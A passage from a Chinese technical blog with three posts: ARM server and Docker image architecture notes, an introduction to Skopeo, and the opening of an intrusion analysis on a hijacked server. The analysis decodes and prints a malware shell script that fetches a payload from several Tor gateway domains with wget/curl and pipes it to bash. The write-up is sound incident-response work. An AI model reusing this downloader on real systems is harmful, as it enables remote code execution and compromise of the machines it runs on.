class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[yiran@node 18:38:21 ~]<span class="variable">$dmidecode</span> </span><br><span class="line"><span class="comment"># dmidecode 3.0</span></span><br><span class="line">Getting SMBIOS data from sysfs.</span><br><span class="line">SMBIOS 2.7 present.</span><br><span class="line">125 structures occupying 5286 bytes.</span><br><span class="line">Table at 0x000EC640.</span><br><span class="line"></span><br><span class="line">Handle 0x0000, DMI <span class="built_in">type</span> 0, 24 bytes</span><br><span class="line">BIOS Information</span><br><span class="line">	Vendor: American Megatrends Inc.</span><br><span class="line">	Version: 3.0</span><br><span class="line">	Release Date: 06/28/2013</span><br><span class="line">	Address: 0xF0000</span><br><span class="line">	Runtime Size: 64 kB</span><br><span class="line">	ROM Size: 12288 kB</span><br><span class="line">	Characteristics:</span><br><span class="line">		PCI is supported</span><br><span class="line">		BIOS is upgradeable</span><br><span class="line">		BIOS shadowing is allowed</span><br><span class="line">		Boot from CD is supported</span><br><span class="line">		Selectable boot is supported</span><br><span class="line">		BIOS ROM is socketed</span><br><span class="line">		EDD is supported</span><br><span class="line">		5.25<span class="string">"/1.2 MB floppy services are supported (int 13h)</span></span><br><span class="line"><span class="string">		3.5"</span>/720 kB floppy services are supported (int 13h)</span><br><span class="line">		3.5<span class="string">"/2.88 MB floppy services are supported (int 13h)</span></span><br><span class="line"><span class="string">		Print screen service is supported (int 5h)</span></span><br><span class="line"><span class="string">		8042 keyboard services are supported (int 9h)</span></span><br><span class="line"><span class="string">		Serial services are supported (int 14h)</span></span><br><span class="line"><span class="string">		Printer services are supported (int 17h)</span></span><br><span class="line"><span class="string">		ACPI is supported</span></span><br><span class="line"><span class="string">		USB legacy is supported</span></span><br><span class="line"><span class="string">		BIOS boot specification is supported</span></span><br><span class="line"><span class="string">		Function key-initiated network boot is supported</span></span><br><span class="line"><span class="string">		Targeted content distribution is supported</span></span><br><span class="line"><span class="string">		UEFI is supported</span></span><br><span class="line"><span class="string">	BIOS Revision: 3.0</span></span><br></pre></td></tr></table></figure>
<h3 id="dev-mem"><a href="#dev-mem" class="headerlink" title="/dev/mem"></a>/dev/mem</h3><p><code>/dev/mem</code> 是物理内存的映像，可以直接通过它来访问物理内存，在代码运行中，发现服务器一直报错：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">** COLLECTED WARNINGS **</span><br><span class="line">Failed to open memory buffer (/dev/mem): No such file or directory</span><br><span class="line">No SMBIOS nor DMI entry point found, sorry.</span><br><span class="line">Permission denied to memory file/device (/dev/mem)</span><br><span class="line">Permission denied to memory file/device (/dev/mem)</span><br><span class="line">** END OF WARNINGS **</span><br></pre></td></tr></table></figure>
<p>发现在服务器上没有 <code>/dev/mem</code> 设备，不知道 ARM 服务器是怎么处理这种情况的。</p>
<p>P.S. 最终查明是 <code>smartctl</code> 这个命令一直在读取 <code>/dev/mem</code>。</p>
<h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>ARM64v8 架构的 CPU 理论上是支持 KVM 虚拟化的，但是很可惜，我手上这台友商100 服务器不支持，据说 200 支持，但是没拿到，支持到什么级别不清楚了。（反正我不敢用</p>
<h2 id="容器？银弹？"><a href="#容器？银弹？" class="headerlink" title="容器？银弹？"></a>容器？银弹？</h2><p>读到这里的可能会问，既然你 MongoDB 和 Envoy 都能运行在容器上，那你把其他服务一起运行在容器上不就薅了么？</p>
<p>嗯，不是没想过，对于我来说，这面临一个服务管理上的问题，成本太高不适合。</p>
<p>其次，容器真的就那么容易么？</p>
<p>大家在使用 Docker 的时候是否注意过自己使用的镜像架构是什么？反正我是没有。一般是 <code>docker pull</code> 拉下来直接用，而且 Docker 并没有提供某些命令或者参数让你能直接拉取其他架构下的镜像，你想知道自己的镜像是什么架构的？可以通过 <code>docker inspect</code> 查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@node ~]<span class="comment"># docker pull centos</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">no matching manifest <span class="keyword">for</span> linux/arm64/v8 <span class="keyword">in</span> the manifest list entries <span class="comment"># 如果没有当前架构下的，那么就会拉取报错</span></span><br><span class="line">[root@node ~]<span class="comment"># docker pull centos:7</span></span><br><span class="line">7: Pulling from library/centos</span><br><span class="line">4856e02b0d50: Pull complete </span><br><span class="line">Digest: sha256:307835c385f656ec2e2fec602cf093224173c51119bbebd602c53c3653a3d6eb</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:7</span><br><span class="line">docker.io/library/centos:7</span><br><span class="line">[root@node ~]<span class="comment"># docker inspect centos:7</span></span><br><span class="line">...</span><br><span class="line">        <span class="string">"Architecture"</span>: <span class="string">"arm64"</span>,</span><br><span class="line">        <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">        <span class="string">"Size"</span>: 238639700,</span><br><span class="line">        <span class="string">"VirtualSize"</span>: 238639700,</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>看着没啥问题，我也用起来了，但是某些镜像我发现很奇怪的一点，<code>docker pull</code> 下来的是 amd64 ，但是镜像中的文件是 aarch64 的，我很奇怪，以为自己搞错了，但是确实可以运行，这样的镜像还不少，比如 coredns：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@node ~]<span class="comment"># docker images |grep coredns/coredns</span></span><br><span class="line">coredns/coredns                                                      1.6.2               f937200cdbb2        2 months ago        42.2MB</span><br><span class="line">[root@node ~]<span class="comment"># docker inspect coredns/coredns:1.6.2 |grep -i amd</span></span><br><span class="line">        <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">[root@node ~]<span class="comment"># docker run coredns/coredns:1.6.2</span></span><br><span class="line">.:53</span><br><span class="line">2019-11-01T10:40:29.192Z [INFO] CoreDNS-1.6.2</span><br><span class="line">2019-11-01T10:40:29.192Z [INFO] linux/arm64, go1.12.8, 795a3eb</span><br><span class="line">CoreDNS-1.6.2</span><br><span class="line">linux/arm64, go1.12.8, 795a3eb</span><br></pre></td></tr></table></figure>
<p>搞定了 Docker 是怎么玩的，接下来尝试 Kubernetes，发现国内的镜像源居然没有 ARM64 的版本，放弃了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>国产化浪潮更大的意义是战略性的，真正要用起来，需要花费很大的精力去一点点适配兼容，如果你不想折腾，还是远离的好。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/26/Skopeo-初次体验/" itemprop="url">Skopeo 初次体验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-26T22:52:06+08:00">
                2019-10-26
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/26/Skopeo-初次体验/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/26/Skopeo-初次体验/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>新一代容器工具体验系列已经完成了 Podman 和 Buildah 的介绍，今天来体验下三剑客中的 Skopeo。</p>
<p>容器工具体验系列：</p>
<ul>
<li><a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman 初次体验</a></li>
<li><a href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Buildah 初次体验</a></li>
<li><a href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">Skopeo 初次体验</a></li>
</ul>
<h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>Skopeo 的功能很简单，一句话描述就是：提供远程仓库的镜像管理能力。</p>
<p>功能列表：</p>
<ul>
<li>复制镜像，无需特殊权限即可从不通仓库复制镜像</li>
<li>无需拉取镜像即可获取远程镜像仓库中的镜像属性（包括 layer）</li>
<li>删除镜像仓库中的镜像</li>
<li>…</li>
</ul>
<p>支持镜像仓库类型：</p>
<ul>
<li>container-storage</li>
<li>本地路径</li>
<li>docker registry 仓库</li>
<li>docker 打包镜像文件</li>
<li>本地 docker 拉取的镜像文件</li>
<li>OCI 镜像</li>
<li>…</li>
</ul>
<p><strong>吐槽：Podman 和 Buildah 好歹都有自己的域名： podman.io 和 buildah.io ，Skopeo 虽然用的少但是也得搞个官网吧。。。</strong></p>
<h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><p>知道了 Skopeo 主要是对镜像仓库及镜像信息的获取，那么我们来看几个具体的例子，了解下 Skopeo 的使用。</p>
<h3 id="镜像详情"><a href="#镜像详情" class="headerlink" title="镜像详情"></a>镜像详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo inspect docker://docker.io/fedora       </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"Name"</span>: <span class="string">"docker.io/library/fedora"</span>,</span><br><span class="line">    <span class="string">"Digest"</span>: <span class="string">"sha256:8a91dbd4b9d283ca1edc2de5dbeef9267b68bb5dae2335ef64d2db77ddf3aa68"</span>,</span><br><span class="line">    <span class="string">"RepoTags"</span>: [</span><br><span class="line">        <span class="string">"20"</span>,</span><br><span class="line">        <span class="string">"21"</span>,</span><br><span class="line">        <span class="string">"22"</span>,</span><br><span class="line">        <span class="string">"23"</span>,</span><br><span class="line">        <span class="string">"24"</span>,</span><br><span class="line">        <span class="string">"25"</span>,</span><br><span class="line">        <span class="string">"26-modular"</span>,</span><br><span class="line">        <span class="string">"26"</span>,</span><br><span class="line">        <span class="string">"27"</span>,</span><br><span class="line">        <span class="string">"28"</span>,</span><br><span class="line">        <span class="string">"29"</span>,</span><br><span class="line">        <span class="string">"30"</span>,</span><br><span class="line">        <span class="string">"31"</span>,</span><br><span class="line">        <span class="string">"32"</span>,</span><br><span class="line">        <span class="string">"branched"</span>,</span><br><span class="line">        <span class="string">"heisenbug"</span>,</span><br><span class="line">        <span class="string">"latest"</span>,</span><br><span class="line">        <span class="string">"modular"</span>,</span><br><span class="line">        <span class="string">"rawhide"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"Created"</span>: <span class="string">"2019-09-27T21:20:57.589955018Z"</span>,</span><br><span class="line">    <span class="string">"DockerVersion"</span>: <span class="string">"18.06.1-ce"</span>,</span><br><span class="line">    <span class="string">"Labels"</span>: &#123;</span><br><span class="line">        <span class="string">"maintainer"</span>: <span class="string">"Clement Verna \u003ccverna@fedoraproject.org\u003e"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">    <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">    <span class="string">"Layers"</span>: [</span><br><span class="line">        <span class="string">"sha256:9908e46907377e84bd6646bdb18abebeb4163b85135739e1cd60aae154d4557c"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以直接从 Docker 官方仓库中查看远程镜像的信息，默认显示所有 RepoTags，也可以增加 tag 参数来显示具体的某个 Tag 镜像的信息。</p>
<p>来看下具体的镜像信息包含什么，包含镜像的创建时间、Docker 版本、标签信息、哈希值，包含镜像的 Layers 信息等，默认输出并没有镜像大小信息。</p>
<p>前段时间参加了 VMware Harbor 的一个沙龙，他们在 1.9.0 版本中增加了配额功能，据他们的研发说在关于镜像大小的计算上花费了很大的精力，因为镜像是分层的，在不通镜像之间的数据共享和计算上容易出现偏差，Skopeo 无法获取每层的大小，瞬间感觉使用价值不大了（- - </p>
<h3 id="镜像拷贝"><a href="#镜像拷贝" class="headerlink" title="镜像拷贝"></a>镜像拷贝</h3><p>将远端镜像拷贝到本地：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ mkdir fedora                                                                                                   1 ↵</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo copy docker://fedora:32 dir:/root/fedora                                           </span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob a39edc9e7bc3 <span class="keyword">done</span></span><br><span class="line">Copying config e13031c001 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ ls fedora </span><br><span class="line">a39edc9e7bc3a586926c94144a8c7ebc83dbfaa17c2a60f4ad56df7066cba285  manifest.json</span><br><span class="line">e13031c001a8b4a574e3088e2d1ab331d72d821804ccacdd41bf5662ae02cc98  version</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ ll fedora               </span><br><span class="line">total 67M</span><br><span class="line">-rw-r--r-- 1 root root  67M Oct 26 20:18 a39edc9e7bc3a586926c94144a8c7ebc83dbfaa17c2a60f4ad56df7066cba285</span><br><span class="line">-rw-r--r-- 1 root root 2.0K Oct 26 20:18 e13031c001a8b4a574e3088e2d1ab331d72d821804ccacdd41bf5662ae02cc98</span><br><span class="line">-rw-r--r-- 1 root root  529 Oct 26 20:18 manifest.json</span><br><span class="line">-rw-r--r-- 1 root root   33 Oct 26 20:18 version</span><br></pre></td></tr></table></figure>
<p>将远端镜像拷贝到其他镜像仓库：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo copy --dest-creds=zdyxry:xxxxxxxx docker://fedora:32 docker://zdyxry/fedora:32    </span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob a39edc9e7bc3 skipped: already exists</span><br><span class="line">Copying config e13031c001 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">root@yiran-workstation:~ </span><br><span class="line"> $ skopeo inspect --creds zdyxry:xxxxxxxx docker://zdyxry/fedora:32</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"Name"</span>: <span class="string">"docker.io/zdyxry/fedora"</span>,</span><br><span class="line">    <span class="string">"Digest"</span>: <span class="string">"sha256:3f3fc6a4714e44fae9147bc2b9542ac627491c13c4a3375e5066bdddc7710c9e"</span>,</span><br><span class="line">    <span class="string">"RepoTags"</span>: [</span><br><span class="line">        <span class="string">"32"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"Created"</span>: <span class="string">"2019-09-27T21:21:30.467123272Z"</span>,</span><br><span class="line">    <span class="string">"DockerVersion"</span>: <span class="string">"18.06.1-ce"</span>,</span><br><span class="line">    <span class="string">"Labels"</span>: &#123;</span><br><span class="line">        <span class="string">"maintainer"</span>: <span class="string">"Clement Verna \u003ccverna@fedoraproject.org\u003e"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">    <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">    <span class="string">"Layers"</span>: [</span><br><span class="line">        <span class="string">"sha256:a39edc9e7bc3a586926c94144a8c7ebc83dbfaa17c2a60f4ad56df7066cba285"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="镜像删除"><a href="#镜像删除" class="headerlink" title="镜像删除"></a>镜像删除</h3><p>Skopeo 提供了命令可以直接删除远端镜像仓库中的镜像（Docker 官方仓库不支持该功能），这为 CI/CD 提供了更多的可能性。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ skopeo delete docker://localhost:5000/imagename:latest</span><br></pre></td></tr></table></figure>
<h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>看过前面两篇文章的同学都知道，Podman 和 Buildah 其实是将 Docker 原有的功能进行了拆分和改进，使其使用上更友好，但是我相信大部分同学日常使用 Podman 和 Buildah 就足够了，那么为什么使用被宣称为三剑客的 Skopeo ？为了解决什么问题？</p>
<p>在 Quora 上搜到了这个问题，RedHat 容器运行时团队的 Leader Daniel Walsh 回答了这个问题，我整理了一下大概是以下几点原因：</p>
<ul>
<li>最初向 Docker 提 PR 想增加 <code>docker inspect -remote</code> 功能，即不用拉取镜像就可以获取镜像信息，但是被拒绝了，官方建议自己实现该功能</li>
<li>Skopeo 在希腊语中的意思是 <strong>远程查看</strong>，最初实现的功能就是远程查看镜像信息</li>
<li>后续扩展功能增加了镜像的拉取，推送，复制等功能</li>
</ul>
<p>我自己日常在使用 Docker 的时候，通常是 <code>docker pull</code> 得到自己想要的镜像之后，通过 Dockerfile 构建自己的镜像，然后再通过 <code>docker push</code> 推送到镜像仓库，不太会关心镜像仓库的维护，而 Skopeo 就是负责这个事情。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.systutorials.com/docs/linux/man/1-skopeo/" target="_blank" rel="noopener">https://www.systutorials.com/docs/linux/man/1-skopeo/</a></li>
<li><a href="http://saharsh.org/2019/01/18/buildah_podman_skopeo/" target="_blank" rel="noopener">http://saharsh.org/2019/01/18/buildah_podman_skopeo/</a></li>
<li><a href="https://www.quora.com/What-is-skopeo-and-why-it-is-used-in-containers" target="_blank" rel="noopener">https://www.quora.com/What-is-skopeo-and-why-it-is-used-in-containers</a> </li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/10/25/记一次系统被入侵分析过程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/25/记一次系统被入侵分析过程/" itemprop="url">记一次系统被入侵分析过程</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-25T22:33:06+08:00">
                2019-10-25
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/25/记一次系统被入侵分析过程/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/25/记一次系统被入侵分析过程/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天早上接到同事报警，环境中两个节点出现了 CPU 使用率告警，通过 <code>top</code> 查看发现是一个叫 <code>iSdqkI</code> 的进程，但是这明显不是常规进程，初步怀疑是系统被入侵了，在同事的协助下最终解决了。这次主要记录遇到这种问题的排查思路，也算是对过程的复述。</p>
<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>首先我们得到的信息是 CPU 使用率告警，第一时间是通过 <code>top</code> 来看看是哪个进程在作怪：</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i01.png" title="i01">
<p>可以看到 <code>FnrgiY</code> 这个进程 CPU 使用率为 556%，且这个进程不是我们系统中存在的进程，这里判断是入侵后被植入的软件，通过 <code>ps</code> 命令查看进程的具体执行内容：</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i02.png" title="i02">
<p>可以看到， <code>FnrgiY</code> 应该是一个可执行的程序（可能是脚本，也可能是一个 binary 文件），我非常年轻的想通过 <code>find</code> 查看这个文件在哪，然后 kill 掉进程删除文件就好了：</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i03.png" title="i03">
<p>嗯，果然年轻了，系统下不存在该文件，那么我们尝试在 <code>/proc/15582</code> 下来看看有什么线索，先看看 <code>cmdline</code> ，跟进程名相同，没啥信息</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i04.png" title="i04">
<p>同样 <code>stack</code> 文件也没什么有用的信息</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i05.png" title="i05">
<p>来看看这个进程的 <code>cwd</code> 是啥，可以看到 <code>cwd</code> 是 <code>/usr/bin</code> 路径的软链接，但是我刚刚已经检查过了，在 <code>/usr/bin/</code> 下没有这个可执行文件</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i06.png" title="i06">
<p>通过 <code>lsof -p</code> 命令，来看看这个进程打开了哪些文件，可以看到它启动的进程文件是 <code>/usr/bin/e6bb0f*</code> ，但是被删掉了，然后它还有一个 TCP 连接（先不管），看到一个存在的文件 <code>/tmp/.X11-unix/1</code> </p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i07.png" title="i07">
<p>来看看这个文件是啥，<code>cat</code> 一下发现这个文件其实是 pid 文件，并没有其他信息</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i08.png" title="i08">
<p>既然它用到了这个文件，那么我们来看下这个文件所在路径，引用 <a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">StackExchange</a> 里面的回答：</p>
<blockquote>
<p>The X11 server (usuall Xorg these days) communicates with clients like xterm, firefox, etc via some kind of reliable stream of bytes. A Unix domain socket is probably a bit more secure than a TCP socket open to the world, and probably a bit faster, as the kernel does it all, and does not have to rely on an ethernet or wireless card.</p>
</blockquote>
<p>我们来看下这个路径下还有什么文件，发现了 3 个异常的文件： 01, 1, 2，其中 1 文件是异常进程的 pid 文件，2 文件是空的，01 文件记录也是一个 pid</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i09.png" title="i09">
<p>通过 <code>ps</code> 来查看这个 pid 对应进程，也是一个异常进程，这个进程有一个子进程是执行了一个 Shell 脚本，是通过 Base64 编码过的，来解码看看</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i10.png" title="i10">
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~ </span><br><span class="line"><span class="meta"> $</span><span class="bash"> <span class="built_in">echo</span> ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KdD10b3JudHBheG53Nnl4aGw0CnUoKSB7Cng9L2Nybgp3Z2V0IC10MSAtVDE4MCAtcVUtIC1PLSAtLW5vLWNoZWNrLWNlcnRpZmljYXRlICQxJHggfHwgY3VybCAtbTE4MCAtZnNTTGtBLSAkMSR4Cn0KaWYgISBscyAvcHJvYy8kKGNhdCAvdG1wLy5YMTEtdW5peC8wMSkvaW87IHRoZW4KKAp1ICR0Lm9uaW9uLmdsYXNzIHx8CnUgJHQuY2l2aWNsaW5rLm5ldHdvcmsgfHwKdSAkdC5vbmlvbi5tbiB8fAp1ICR0Lm9uaW9uLnNoIHx8CnUgJHQub25pb24uaW4ubmV0IHx8CnUgJHQudG9yMndlYi5pbyB8fAp1ICR0LjR0b3IubWwgfHwKdSAkdC5vbmlvbi50bwopfGJhc2gKZmkK|base64 -d</span></span><br><span class="line"></span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line">t=torntpaxnw6yxhl4</span><br><span class="line">u() &#123;</span><br><span class="line">x=/crn</span><br><span class="line">wget -t1 -T180 -qU- -O- --no-check-certificate $1$x || curl -m180 -fsSLkA- $1$x</span><br><span class="line">&#125;</span><br><span class="line">if ! ls /proc/$(cat /tmp/.X11-unix/01)/io; then</span><br><span class="line">(</span><br><span class="line">u $t.onion.glass ||</span><br><span class="line">u $t.civiclink.network ||</span><br><span class="line">u $t.onion.mn ||</span><br><span class="line">u $t.onion.sh ||</span><br><span class="line">u $t.onion.in.net ||</span><br><span class="line">u $t.tor2web.io ||</span><br><span class="line">u $t.4tor.ml ||</span><br><span class="line">u $t.onion.to</span><br><span class="line">)|bash</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>我们可以看看这个脚本的内容，先是重定向了标准输出，然后定义了一个函数，函数的作用是 wget/curl 下载一个文件，如果对应 pid 文件不存在，那么执行这个函数，并传递了很多的域名。</p>
<p>现在问题来了，进程怎么执行的？因为我有两台机器都有问题，我尝试 <code>kill</code> 掉异常进程，发现没有自动重启，那么很有可能是在系统上存在定时任务，通过 <code>crontab -l</code> 查看</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i11.png" title="i11">
